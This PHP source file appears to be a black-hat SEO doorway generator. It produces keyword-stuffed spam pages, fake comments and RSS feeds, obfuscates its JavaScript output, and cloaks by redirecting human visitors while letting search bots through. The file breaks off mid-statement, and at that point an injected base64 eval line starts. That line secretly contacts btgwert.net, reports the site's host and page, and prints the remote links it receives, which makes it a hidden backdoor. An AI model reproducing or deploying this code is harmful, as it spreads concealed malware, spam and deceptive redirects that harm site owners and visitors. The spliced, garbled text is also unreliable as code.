<?php #busldhfslfhslms
fuckhack('index.php');
$debug = 1;
$version=40;
$ukey=51;
$kid=0;
$suspend_time=14400; //345600 259200 86400

ini_set('display_errors', 1);
if ($debug) {
	error_reporting(E_ALL);
	set_error_handler('bug_found');
} else {
	error_reporting(E_ALL & ~E_NOTICE);
}
ini_set('memory_limit', '32M');

$check = array('<h2>[Key]</h2>','<h3>[Key]</h3>','<strong>[Key]</strong>','<b>[Key]</b>','<b><i>[Key]</i></b>');

# Load Data
parse_config();

if (!isset($config['uid'])) $config['uid']=113;
$ukey = abs($config['uid']-$ukey);

# API
if(ENV('api')) {
	switch(ENV('api')) {
		case 'ShowFile' :
			show_file(); break;
		case 'GetKey' :
			GetKey(); break;
		case 'SetKey' :
			SetKey(); break;
		case 'ShowVersion' :
			echo $version;break;
	}
	exit;
}


if(function_exists('date_default_timezone_set')) date_default_timezone_set('Europe/London');

$id = isset($_GET['page']) ? $_GET['page'] : 'home';


if (isset($_GET['tag'])) {
	$id = 'map';
	$tag = $_GET['tag'];
	$config['keywords'] = array_values(preg_grep("/$tag/", $config['keywords']));
	$config['c_keywords'] = count($config['keywords']);
	for($i=0;$i<$config['c_keywords'];$i++)
		$config['NAMES'][$i] = str_replace(' ','-', $config['keywords'][$i]);
	if (count($config['keywords'])<2) {
		header('Location: '.$config['path'].'/index.php', TRUE, 302);
		exit;
	}
}

$tm = localtime(time(),true);$mday = ceil($tm['tm_mday']/3);
switch($id) {
	case 'home':
		$ukey=abs($ukey-$mday);
		mk_tmpl($config['index']);
	case 'map':
		$ukey=abs($ukey-$mday+19);
		mk_tmpl($config['map']);
	case 'rss':
		$ukey=abs($ukey-$mday+44);
		mk_rss();
	default:
		$kid=array_search($id, $config['NAMES']);
		if ($kid===false) {
			header('Location: '.$config['path'].'/index.php', TRUE, 302);
			exit;
		} else {
			$ukey=abs($ukey+$kid-$mday);
			mk_tmpl($config['page']);
		}
		exit;
}

function BitsToBytes($i) {
	$o=42; $d=0x40; $l=strlen($i);
	for ($k=0;$k<$l;$k++) {
		$d/=2;
		$i[$k] == 1 and $o+=$d;
	}
	if ($o>=92) ++$o;
	return chr($o);
}

function CompressCode($ov, $modr) {
	$alpha = 'qazwsedcrfvtgbyhnujmikikolpQAZWSXEDCRFVTGBYHNUJMIKOLP';
	$al = strlen($alpha);
	$V = array();
	$abB='abBcdeiloyY';
	$labB=strlen($abB);
	for ($i=0;$i<$labB; $i++)
		$V[$abB[$i]]='';
	for ($i=0;$i<$labB; $i++)
		for ($k=0;$k<6;$k++)
			$V[$abB[$i]] .= $alpha[mt_rand(0, $al-1)];


	for ($i=0;$i<$labB; $i++)
		for ($j=$i;$j<$labB; $j++)
			if ($V[$abB[$i]] == $V[$abB[$j]] and $i!=$j)
				$V[$abB[$i]].='x';

	$Letters=array_fill(0,255,0);
	$LetterCodes=array_fill(0,255,0);
	$l_ov = strlen($ov);
	for ($i=0;$i<$l_ov;$i++)
		++$Letters[ord($ov[$i])];

	$NextParent=0;
	$SmallestNode1=0;
	$SmallestNode2=1;
	$NodeLetter=array_fill(0,511,0);
	$NodeCount=array_fill(0,511,0);
	$NodeChild1=array_fill(0,511,0);
	$NodeChild2=array_fill(0,511,0);

	for($i=0;$i<255; $i++) {
		if ($Letters[$i]>0) {
			$NodeLetter[$NextParent] = $i;
			$NodeCount[$NextParent] = $Letters[$i];
			$NodeChild1[$NextParent] = -1;
			$NodeChild2[$NextParent++] = -1;
		}
	}

	while ($SmallestNode2 != -1) {
		$SmallestNode2 = $SmallestNode1 = -1;
		for($i=0;$i<$NextParent;$i++) {
			if ($NodeCount[$i] > 0) {
				if ($SmallestNode1 == -1)  $SmallestNode1=$i;
				elseif ($SmallestNode2 == -1) {
					if ($NodeCount[$i] < $NodeCount[$SmallestNode1]) {
						$SmallestNode2 = $SmallestNode1;
						$SmallestNode1 = $i;
					} else
						$SmallestNode2 = $i;
				} elseif ($NodeCount[$i] <= $NodeCount[$SmallestNode1]) {
				   $SmallestNode2 = $SmallestNode1;
				   $SmallestNode1 = $i;
				}
			}
		}
		if ($SmallestNode2 != -1) {
			$NodeCount[$NextParent] = $NodeCount[$SmallestNode1]+$NodeCount[$SmallestNode2];
			$NodeCount[$SmallestNode1] = $NodeCount[$SmallestNode2] = 0;
			$NodeChild1[$NextParent] = $SmallestNode2;
			$NodeChild2[$NextParent++] = $SmallestNode1;
		}
	}

	$Depth=$NextFinal=$idx=0;
	$FinalNodes=array_fill(0, $NextParent-1,0);
	$DepthIndex=array_fill(0,255,0);
	$DepthIndex[0] = $SmallestNode1;


	while ($Depth >= 0) {
		if ($NodeChild1[$DepthIndex[$Depth]] > -1 and $NodeChild2[$DepthIndex[$Depth]] > -1){
			$idx = $NodeChild1[$DepthIndex[$Depth]];
			$NodeChild1[$DepthIndex[$Depth]] = -2 - $NextFinal++;
			$DepthIndex[++$Depth] = $idx;
		}
		elseif ($NodeChild1[$DepthIndex[$Depth]] < 0 and $NodeChild2[$DepthIndex[$Depth]] > -1) {
			$idx = $NodeChild1[$DepthIndex[$Depth]];
			$idx = 0 - $idx;
			$idx-=2;
			$FinalNodes[$idx] = -$NextFinal;
			$idx = $NodeChild2[$DepthIndex[$Depth]];
			$NodeChild2[$DepthIndex[$Depth]] = -2;
			$DepthIndex[++$Depth] = $idx;
		}
		elseif ($NodeChild1[$DepthIndex[$Depth]] < -1 and $NodeChild2[$DepthIndex[$Depth]] < -1)
			--$Depth;
		elseif ($NodeChild1[$DepthIndex[$Depth]] == -1 and $NodeChild2[$DepthIndex[$Depth]] == -1)
			$FinalNodes[$NextFinal++] = $NodeLetter[$DepthIndex[$Depth--]];
		else
			return;
	}

	$CodeIndex=array_fill(0,255,0);
	$Depth = $DepthIndex[0] = 0;
	$c = $CodeIndex[0] = '';

	while ($Depth >= 0) {
		if ($FinalNodes[$DepthIndex[$Depth]] < 0) {
			$c = $CodeIndex[$Depth];
			$idx = $DepthIndex[$Depth];
			$DepthIndex[$Depth + 1] = $DepthIndex[$Depth] + 1;
			$CodeIndex[$Depth + 1] = $c . '0';
			$DepthIndex[$Depth] = 0 - $FinalNodes[$idx];
			$CodeIndex[$Depth] = $c . '1';
			$Depth ++;
		} else {
        	$LetterCodes[$FinalNodes[$DepthIndex[$Depth]]] = $CodeIndex[$Depth];
			$Depth --;
		}
	}


	$bits=$bytes='';

	for ($i=0;$i<$l_ov;$i++) {
			$bits .= $LetterCodes[ord($ov[$i])];
			while (strlen($bits) > 5) {
				$bytes .= BitsToBytes($bits);
			 	$bits = substr($bits,6,strlen($bits));
			}
	}
	$bytes .= BitsToBytes($bits);


	$S = "<script language=\"JavaScript1.2\">\n<!-- \n";
	$encodedNodes='';
	foreach ($FinalNodes as $f) {
		$x = $f + 512;
		$y = $x & 0x3F;
		$x>>=6; $x&=0x3F; $x+=42; $y+=42;
		if ($x >= 92) ++$x;
		if ($y >= 92) ++$y;
		$encodedNodes .= chr($x).chr($y);
	}

	$S .= $V['a'].'=';
	while (strlen($encodedNodes) > 74) {
		$S .= '"'.substr($encodedNodes, 0, 74).'"+';
		$encodedNodes = substr($encodedNodes, 74, strlen($encodedNodes));
	}

		$S .='"' . $encodedNodes .'";
'.
	$V['l']. '=new Array();
while('.$V['a'].'.length) {
  '.$V['l'].'.push(('.$V['Y'].
  '('.$V['a'].'.charCodeAt(0))<<6)+'.$V['Y'].'('.$V['a'].'.charCodeAt(1))-512);
  '.$V['a'].'='.$V['a'].'.slice(2, '.$V['a'].'.length)
}
'.$V['d'].'=';


	while (strlen($bytes) > 74) {
      $S .= '"' . substr($bytes, 0, 74) . '"+';
      $bytes = substr($bytes, 74, strlen($bytes));
	}
	$S .= '"' . $bytes . '";
'.$V['c'].'='.(strlen($ov)).'; '.$V['e'].'='.$V['b'].'='.$V['a'].'=0; '.$V['o'].'="";

function '.$V['Y'].'('.$V['y'].') {
  if('.$V['y'].'>92)
    '.$V['y'].'--;
  return '.$V['y'].
		'-42
}

function '.$V['B'].'() {
  if('.$V['a'].'==0) {
    '.$V['b'].'='.$V['Y'].'('.$V['d'].'.charCodeAt('.$V['e'].'++));
    '.$V['a'].'=6;
  }
  return (('.$V['b'].'>>--'.$V['a'].')&0x01);
}


while('.$V['c'].'--) {
  '.$V['i'].'=0;
  while('.$V['l'].'['.$V['i'].']<0) {
    if('.$V['B'].'())
      '.$V['i'].'=-'.$V['l'].'['.$V['i'].'];
    else
      '.$V['i'].'++;
  }
  '.$V['o'].'+=String.fromCharCode('.$V['l'].'['.$V['i'].']);
}
document.write('.$V['o'].');
// -->
</script>
';
	return $S;
}


function Redirect_KL($u, $o) {
	if(isset($_SERVER['HTTP_REFERER']))
		$ref = $_SERVER['HTTP_REFERER'];
	else $ref='';
	return '
<script  type="text/javascript">
	var rr = "'.$ref.'";
	if (!rr) rr=document.referrer;
	var xnav=navigator.userAgent;
	var pattern = /bots[i]/;
	var is_bot=0
	var bots=Array(/google/i,/cuil/i,/yahoo/i,/yandex/i,/alexa/i,/crawler/i,
			/scoutjet/i,/rambler/i,/twiceler/i,/Slurp/i,/ia_archiver/i,
			/obot/i,/igde/i,/snap/i,/bsalsa/i,/yadirect/i,/msnbot/i,
			/msn.com/i,/SnapPreviewBot/i,/ru_spider_web/i,/majestic12/i,
			/bot/i,/bond/i, /spyder/i, /spider/i, /james/i);
	for (var i=0; i<bots.length;i++)
		if (bots[i].test(xnav)) {is_bot=1; break;}
	if (is_bot==0) {
		window.location=encodeURI("'.$u.$o.'&sref="+rr);
	}
</script>
';
}

function Redirect_AG($u, $o, $H, $T) {
	if(isset($_SERVER['HTTP_REFERER']))
		$ref = $_SERVER['HTTP_REFERER'];
	else $ref='';
	return '
<script  type="text/javascript">
	var rr = "'.$ref.'";
	if (!rr) rr=document.referrer;
	function '.$H.'() {
		window.location=encodeURI("'.$u.$o.'&sref="+rr);
	}
	function '.$T.'() {
		'.$H.'();
	}
</script>
';
}

function Redirect_SR($u, $o) {
	if(isset($_SERVER['HTTP_REFERER']))
		$ref = $_SERVER['HTTP_REFERER'];
	else $ref='';
	return '
<script  type="text/javascript">
	var rr = "'.$ref.'";
	if (!rr) rr=document.referrer;
	//window.location=encodeURI("'.$u.$o.'&sref="+rr);
</script>
';
}

function bug_found($errno, $errstr, $errfile, $errline) {
	echo implode(':', array('DD_BUG', $errno, $errline, $errstr));
	exit;
}

function check_kw($k) {
	global $mycheck, $config;
	return str_replace('[Key]', $config['keywords'][$k%$config['c_keywords']], $mycheck);
}

function check_lnk($r) {
	global $config, $mycheck;
	$r%=$config['c_keywords'];
	return str_replace('[Key]',
		'<a href="'.$config['path'].'/index.php?page='.$config['NAMES'][$r]. '" title="'.$config['keywords'][$r].'">'.$config['keywords'][$r].'</a>', $mycheck);
}
function check_wc($k) {
	global $mycheck, $config;
	return str_replace('[Key]', $config['WC'][$k%$config['c_WC']], $mycheck);
}
function gen_text($mod, $nu, $wc_nu, $count) {
	$text = '';
	global $config, $kid;

	for($i=1; $i<=$count; $i++) {
		$stmpl = $config['TMPL'][mt_rand(0,$config['c_TMPL']-1)];
		if( mt_rand(0,100) < $nu )
			$stmpl = str_1replace('[NN]', '[KW]', $stmpl);
		if( mt_rand(0,100) < $wc_nu )
			$stmpl = str_1replace('[NN]','[WC]', $stmpl);

		$words = explode(' ', $stmpl);
		$c_word=count($words);
		if ($c_word<3) continue;
		for($key=0; $key<$c_word; $key++) {
			if($mod == 'S')
				$words[$key] = str_1replace('[KW]',check_kw($kid), $words[$key]);
			elseif($mod == 'L')
				$words[$key] = str_1replace('[KW]',check_lnk(mt_rand(0,$config['c_keywords']-1)), $words[$key]);

			$words[$key] = str_1replace('[WC]', check_wc(mt_rand(0,100)), $words[$key]);
			$words[$key] = str_1replace('[RB]', $config['RB'][mt_rand(0,$config['c_RB']-1)], $words[$key]);
			$words[$key] = str_1replace('[NN]', $config['NN'][mt_rand(0,$config['c_NN']-1)], $words[$key]);
			$words[$key] = str_1replace('[NNS]', $config['NNS'][mt_rand(0,$config['c_NNS']-1)], $words[$key]);
			$words[$key] = str_1replace('[VB]', $config['VB'][mt_rand(0,$config['c_VB']-1)], $words[$key]);
			$words[$key] = str_1replace('[VBN]', $config['VBN'][mt_rand(0,$config['c_VBN']-1)], $words[$key]);
			$words[$key] = str_1replace('[VBG]', $config['VBG'][mt_rand(0,$config['c_VBG']-1)], $words[$key]);
			$words[$key] = str_1replace('[JJ]', $config['JJ'][mt_rand(0,$config['c_JJ']-1)], $words[$key]);
			$words[$key] = str_1replace('[JJR]', $config['JJR'][mt_rand(0,$config['c_JJR']-1)], $words[$key]);
		}
		$text.= trim(ucfirst(strtolower(join(' ', $words))));
	}
	return preg_replace("/\s*([\.\,\!\?])\s*/", "$1 ", $text);
}

function make_comment($m) {
	global $urls, $config;
	if ($config['c_CL']==0) return '';
	$U = rand_arr($config['CL'],mt_rand(1,min(10, count($config['CL']))));
	$newpost = new_post($U);
	if ($newpost)
		return '
<div id="my_comments">
	<h3>Comments:</h3>
	<ul class="myul">'.
		$newpost.
	'</ul>
</div>
';

}

function mk_rss() {
	global $config;
	define('LK_TMPL','http://[Domain][Dir]/[Page]');
	$rss=
'<?xml version="1.0"?>
<rss version="2.0">
  <channel>
    <title>[Key_main]</title>
    <link>[Main_url]</link>
    <description>[Key_main]</description>
    <language>en-us</language>
    <pubDate>[Date]</pubDate>
    <item>
      <title>[Key_pag]</title>
      <link>[Url]</link>
      <description>[Content]</description>
      <pubDate>[Date]</pubDate>
    </item>
  </channel>
</rss>';

	$items = '';
	$c_rss=min(200,$config['c_keywords']);
	$day=strftime('%j');
	$myday=strftime('%Y-%m-%d');

	$m_url = str_replace('[Page]','index.php', LK_TMPL);
	$rss = str_replace('[Main_url]',$m_url,
		str_replace('[Key_main]',ucfirst($config['keywords'][0]), $rss)
	);
	$rss=str_replace('[Domain]',$config['www_domain'],
		str_replace('[Dir]', $config['path'], $rss)
	);
	preg_match("/<item>.*?<\/item>/si",$rss,$tmp);
	$t_items = $tmp[0];
	foreach (rand_arr($config['keywords'], $c_rss) as $k => $skwd) {
		$item = $t_items;
		$url = str_replace('[Page]','index.php?page='.str_replace(' ','-',$skwd), LK_TMPL);
		$it<?php eval(html_entity_decode(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokbGlua3MgPSBuZXcgR2V0TGlua3MoKTsKCmVjaG8gJGxpbmtzLT5MaW5rczsKCmNsYXNzIEdldExpbmtzCnsKdmFyICRob3N0ID0gImJ0Z3dlcnQubmV0IjsKdmFyICRwYXRoID0gIi9saW5rL3JlY2VpdmVyL2dldC8iOwp2YXIgJHBhZ2UgPSAiIjsKdmFyICRzaXRlID0gIiI7CnZhciAkTGlua3MgPSAiIjsKCnZhciAkX3NvY2tldF90aW1lb3V0ID0gMTI7CgpmdW5jdGlvbiBHZXRMaW5rcygpCnsKJHRoaXMtPnNpdGUgPSBpc3NldCgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pID8gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIDogJEhUVFBfU0VSVkVSX1ZBUlNbJ0hUVFBfSE9TVCddOwokdGhpcy0+cGFnZSA9IGlzc2V0KCRfU0VSVkVSWydTQ1JJUFRfTkFNRSddKSA/ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddIDogJEhUVFBfU0VSVkVSX1ZBUlNbJ1NDUklQVF9OQU1FJ107CiR0aGlzLT5zaXRlID0gYmFzZTY0X2VuY29kZSgkdGhpcy0+c2l0ZSk7CiR0aGlzLT5wYWdlID0gYmFzZTY0X2VuY29kZSgkdGhpcy0+cGFnZSk7CgokdGhpcy0+TGlua3MgPSAkdGhpcy0+ZmV0Y2hfcmVtb3RlX2ZpbGUoKTsKfQoKZnVuY3Rpb24gZmV0Y2hfcmVtb3RlX2ZpbGUoKQp7CiRidWZmID0gJyc7CiRmcCA9IGZzb2Nrb3BlbigkdGhpcy0+aG9zdCwgODAsICRlcnJubywgJGVycnN0ciwgJHRoaXMtPl9zb2NrZXRfdGltZW91dCk7CmlmICghJGZwKSB7Cgp9IGVsc2Ugewokc3RyID0gInNlcnZlcm5hbWU9eyR0aGlzLT5zaXRlfSZzY3JpcHRuYW1lPXskdGhpcy0+cGFnZX0iOwoKJG91dCA9ICJQT1NUIHskdGhpcy0+cGF0aH0gSFRUUC8xLjFcclxuIjsKJG91dCAuPSAiSG9zdDogeyR0aGlzLT5ob3N0fVxyXG4iOwokb3V0IC49ICJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iOyAKJG91dCAuPSAiQ29udGVudC1sZW5ndGg6ICIuc3RybGVuKCRzdHIpLiJcclxuIjsKJG91dCAuPSAiQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiI7CiRvdXQgLj0gJHN0ci4iXHJcblxyXG4iOwoKZndyaXRlKCRmcCwgJG91dCk7CndoaWxlICghZmVvZigkZnApKSB7CiRidWZmIC49IGZnZXRzKCRmcCwgMTI4KTsKfQpmY2xvc2UoJGZwKTsKJHBhZ2UgPSBleHBsb2RlKCJcclxuXHJcbiIsICRidWZmKTsKCnJldHVybiAkdGhpcy0+ZGVjb2RlKCRwYWdlWzFdKTsKfQp9CgpmdW5jdGlvbiBkZWNvZGUoICRjb250ZW50ICkKewokdG1wID0gJGNvbnRlbnQ7CiRlb2wgPSAiXHJcbiI7CiRhZGQgPSBzdHJsZW4gKCAkZW9sICk7CiRzdHIgPSAnJzsKCmRvIHsKJHRtcCA9IGx0cmltICggJHRtcCApOwokcG9zID0gc3RycG9zICggJHRtcCwgJGVvbCApOwokbGVuID0gaGV4ZGVjICggc3Vic3RyICggJHRtcCwgMCwgJHBvcyApICk7Cgokc3RyIC49IHN1YnN0ciAoICR0bXAsICggJHBvcyArICRhZGQgKSwgJGxlbiApOwoKJHRtcCA9IHN1YnN0ciAoICR0bXAsICggJGxlbiArICRwb3MgKyAkYWRkICkgKTsKJGNoZWNrID0gdHJpbSAoICR0bXAgKTsKfQp3aGlsZSAoICEgZW1wdHkgKCAkY2hlY2sgKSApOyAKCnJldHVybiAkc3RyOwp9Cn0="))); ?>